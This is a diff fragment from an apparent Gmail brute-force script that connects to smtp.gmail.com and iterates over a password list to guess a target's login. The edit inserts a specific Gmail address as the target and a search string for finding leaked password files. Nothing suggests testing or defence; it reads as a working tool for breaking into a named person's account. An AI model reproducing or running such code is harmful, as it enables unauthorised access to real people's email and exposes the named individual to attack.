@@ -33,8 +33,8 @@ smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-user = raw_input("Enter the target's email address: ")
-passwfile = raw_input("Enter the password file name: ")
+user = raw_input("Enter the target's email address:maverickgirl11@gmail.com ")
+passwfile = raw_input("Enter the password file name:filetype txt gmail com username password ")
 passwfile = open(passwfile, "r")
 
 for password in passwfile:
